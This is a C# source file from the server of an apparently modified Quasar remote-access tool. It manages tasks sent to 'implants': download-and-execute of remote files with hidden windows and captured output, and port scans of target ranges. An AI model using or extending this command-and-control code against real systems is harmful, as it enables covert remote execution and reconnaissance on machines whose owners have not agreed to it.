using Quasar.Common.Enums;
using Quasar.Common.Logger;
using Quasar.Common.Messages;
using System;
using System.Collections.Generic;
using System.Text;

namespace Quasar.Server.Tasking
{
    /// <summary>
    /// Handles task ID generation and task tracking.
    /// </summary>
    public static class ImplantTaskManager
    {
        private static readonly Dictionary<string, BaseTaskInfo> _implantTaskInfoRecords = new Dictionary<string, BaseTaskInfo>();
        private readonly static object _taskInfoRecordsLock = new object();

        /// <summary>
        /// Generates a new UUID string as a task ID
        /// </summary>
        private static string GenerateNewTaskId()
        {
            return System.Guid.NewGuid().ToString();
        }

        public static void RegisterNewImplantTask(BaseTaskInfo task)
        {
            lock (_taskInfoRecordsLock)
            {
                _implantTaskInfoRecords[task.TaskId] = task;
            }
        }

        public static BaseTaskInfo GetTaskInfo(string taskId)
        {
            lock (_taskInfoRecordsLock)
            {
                if (_implantTaskInfoRecords.ContainsKey(taskId))
                {
                    return _implantTaskInfoRecords[taskId];
                }
                else
                {
                    return null;
                }
            }
        }

        public static bool ImplantTaskExists(string taskId)
        {
            lock (_taskInfoRecordsLock)
            {
                return _implantTaskInfoRecords.ContainsKey(taskId);
            }
        }

        public static void UpdateTaskStatus(string taskId, int status, string statusMsg = "")
        {
            if (!TaskStatus.IsValidStatus(status))
            {
                throw new Exception(String.Format("Could not update task status for task ID {0} - invalid task status {1}.", taskId, status));
            }
            lock (_taskInfoRecordsLock)
            {
                if (_implantTaskInfoRecords.ContainsKey(taskId))
                {
                    _implantTaskInfoRecords[taskId].Status = status;
                    if (!String.IsNullOrEmpty(statusMsg))
                    {
                        _implantTaskInfoRecords[taskId].StatusMsg = statusMsg;
                    }
                    return;
                }
            }
            throw new Exception(String.Format("Could not update task status for task ID {0} - task not found.", taskId));
        }

        public static DoProcessStart CreateAndRegisterExecuteProcessTask(
            string filepath, 
            string downloadUrl, 
            string downloadDest="",
            string processArgs="",
            bool useShellExecute=false,
            bool captureOutput=false,
            bool noWindow=false
        ) {
            ExecuteProcessTaskInfo taskInfo = new ExecuteProcessTaskInfo(
                GenerateNewTaskId(), 
                filepath, 
                downloadUrl,
                downloadDest: downloadDest,
                processArgs: processArgs,
                useShellExecute: useShellExecute,
                captureOutput: captureOutput,
                noWindow: noWindow
            );
            RegisterNewImplantTask(taskInfo);
            return new DoProcessStart {
                TaskId = taskInfo.TaskId,
                FilePath = taskInfo.FilePath,
                DownloadUrl = taskInfo.DownloadUrl, 
                DownloadDestPath = taskInfo.DownloadDestPath,
                ProcessArgs = taskInfo.ProcessArgs,
                UseShellExecute = taskInfo.UseShellExecute,
                CaptureOutput = taskInfo.CaptureOutput,
                NoWindow = taskInfo.NoWindow
            };
        }

        private static void registerExecutedProcessInfo(string taskId, DoProcessResponse resp)
        {
            lock (_taskInfoRecordsLock)
            {
                ExecuteProcessTaskInfo taskInfo = (ExecuteProcessTaskInfo)_implantTaskInfoRecords[taskId];
                taskInfo.PID = resp.PID;
                if (resp.WaitedForExit)
                {
                    taskInfo.ExitCode = resp.ExitCode;
                    taskInfo.Stdout = resp.Stdout;
                    taskInfo.Stderr = resp.Stderr;
                }
            }
        }

        public static void RegisterExecuteProcessTaskResponse(DoProcessResponse resp)
        {
            if (resp.Action == ProcessAction.Start)
            {
                if (!ImplantTaskExists(resp.TaskId))
                {
                    Logger.Error("RegisterExecuteProcessTaskResponse: No implant task found for ID " + resp.TaskId);
                    return;
                }
                try
                {
                    if (resp.Result)
                    {
                        registerExecutedProcessInfo(resp.TaskId, resp);
                        UpdateTaskStatus(resp.TaskId, TaskStatus.STATUS_SUCCESS);
                        if (resp.WaitedForExit)
                        {
                            Logger.Info(String.Format(
                                "ExecuteProcess Task {0} successfully completed. Process PID {1}, exit code {2}\nSTDOUT:\n{3}\n\nSTDERR:\n{4}\n",  
                                resp.TaskId,
                                resp.PID,
                                resp.ExitCode,
                                resp.Stdout,
                                resp.Stderr
                            ));
                        }
                        else
                        {
                            Logger.Info(String.Format("ExecuteProcess Task {0} successfully completed. Process PID {1}",  resp.TaskId, resp.PID));
                        }
                    }
                    else
                    {
                        // Something went wrong
                        Logger.Error(String.Format("ExecuteProcess Task {0} failed: {1}",  resp.TaskId, resp.ResultMsg));
                        UpdateTaskStatus(resp.TaskId, TaskStatus.STATUS_ERROR, resp.ResultMsg);
                    }
                }
                catch (Exception ex)
                {
                    Logger.Error("RegisterExecuteProcessTaskResponse exception: " + ex.ToString());
                }
            }
        }

        public static DoPortScan CreateAndRegisterPortScanTask(string targetRange, int[] targetPorts)
        {
            PortScanTaskInfo taskInfo = new PortScanTaskInfo(
                GenerateNewTaskId(),
                targetRange,
                targetPorts
            );
            RegisterNewImplantTask(taskInfo);
            return new DoPortScan
            {
                TaskId = taskInfo.TaskId,
                TargetRange = taskInfo.TargetRange,
                TargetPorts = taskInfo.TargetPorts
            };
        }

        private static void registerPortScanInfo(string taskId, DoPortScanResponse resp)
        {
            lock (_taskInfoRecordsLock)
            {
                PortScanTaskInfo taskInfo = (PortScanTaskInfo)_implantTaskInfoRecords[taskId];
                if (resp.Result != null)
                {
                    foreach (KeyValuePair<string, int[]> entry in resp.Result)
                    {
                        if (entry.Value != null)
                        {
                            taskInfo.Result[entry.Key] = (int[])entry.Value.Clone();
                        }
                    }
                }
            }
        }

        public static void RegisterPortScanTaskResponse(DoPortScanResponse resp)
        {
            if (!ImplantTaskExists(resp.TaskId))
            {
                Logger.Error("RegisterPortScanTaskResponse: No implant task found for ID " + resp.TaskId);
                return;
            }

            try
            {
                if (resp.Success)
                {
                    registerPortScanInfo(resp.TaskId, resp);
                    UpdateTaskStatus(resp.TaskId, TaskStatus.STATUS_SUCCESS);
                    StringBuilder sb = new StringBuilder();
                    if (resp.Result != null)
                    {
                        foreach (var entry in resp.Result)
                        {
                            if (entry.Value != null && entry.Value.Length > 0)
                            {
                                foreach (var port in entry.Value)
                                {
                                    sb.Append(String.Format("\t{0} has port {1} open\n", entry.Key, port));
                                }
                            }
                        }
                    }
                    else
                    {
                        sb.Append("No results returned.");
                    }
                    Logger.Info(String.Format("PortScan Task {0} successfully completed. Outputting results:\n{1}", resp.TaskId, sb.ToString()));
                }
                else
                {
                    // Something went wrong
                    Logger.Error(String.Format("PortScan Task {0} failed: {1}", resp.TaskId, resp.ResultMessage));
                    UpdateTaskStatus(resp.TaskId, TaskStatus.STATUS_ERROR, resp.ResultMessage);
                }
            }
            catch (Exception ex)
            {
                Logger.Error("RegisterPortScanTaskResponse exception: " + ex.ToString());
            }
        }

        public static Dictionary<string, object> GetTaskInfoDict(string taskId)
        {
            lock (_taskInfoRecordsLock)
            {
                try
                {
                    if (_implantTaskInfoRecords.ContainsKey(taskId))
                    {
                        return _implantTaskInfoRecords[taskId].ConvertToJsonDict();
                    }
                    else
                    {
                        throw new Exception(String.Format(
                            "Failed to generate task info dictionary: task with ID {0} does not exist"
                        ));
                    }
                }
                catch (Exception ex)
                {
                    throw new Exception("Failed to generate task info dictionary: " + ex.Message);
                }
            }
        }
    }
}